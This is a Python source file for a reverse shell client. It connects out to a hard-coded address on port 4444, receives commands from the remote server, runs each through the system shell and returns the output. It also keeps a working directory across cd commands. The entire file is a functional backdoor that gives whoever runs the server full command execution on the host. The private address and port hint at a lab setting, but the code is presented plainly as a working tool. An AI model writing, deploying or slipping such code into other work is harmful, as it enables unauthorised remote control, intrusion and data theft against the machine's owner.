# client_cd.py
import socket
import subprocess
import shlex
import os

SERVER = "192.168.193.113"
PORT = 4444
END_MARKER = b"\n--END--\n"

def run_cmd(cmd):
    """
    Run a command and return bytes of stdout+stderr.
    We keep shell=True for compatibility with common shell constructs.
    If you prefer safer execution, use shlex.split() + shell=False.
    """
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60
        )
        return completed.stdout
    except Exception as e:
        return f"Command error: {e}\n".encode()

def handle_cd(parts):
    """
    parts is a list from shlex.split(cmd).
    Returns bytes reply to send back to server.
    """
    # cd with no args -> HOME
    target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
    target = os.path.expanduser(target)
    try:
        os.chdir(target)
        return f"OK cwd: {os.getcwd()}\n".encode()
    except Exception as e:
        return f"cd failed: {e}\n".encode()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER, PORT))
        print("Connected to server", SERVER, PORT)
        buffer = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                print("Server closed connection")
                break
            buffer += chunk

            # process one or more newline-delimited commands
            while b"\n" in buffer:
                line, _, buffer = buffer.partition(b"\n")
                cmd = line.decode().strip()
                if not cmd:
                    # empty command -> send empty reply
                    s.sendall(b"\n" + END_MARKER)
                    continue

                # built-in handling for exit
                if cmd.lower() == "exit":
                    print("Exit received")
                    s.sendall(b"Exiting\n" + END_MARKER)
                    return

                # tokenise to inspect command (handles quotes)
                try:
                    parts = shlex.split(cmd)
                except Exception:
                    # fallback: run raw command if tokenization fails
                    parts = []

                # handle cd specially (persistent)
                if parts and parts[0] == "cd":
                    reply = handle_cd(parts)
                    s.sendall(reply + END_MARKER)
                    continue

                # otherwise execute normally
                output = run_cmd(cmd)
                # ensure there's at least a newline so server printing looks nice
                if not output.endswith(b"\n"):
                    output += b"\n"
                s.sendall(output + END_MARKER)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Client interrupted, exiting.")
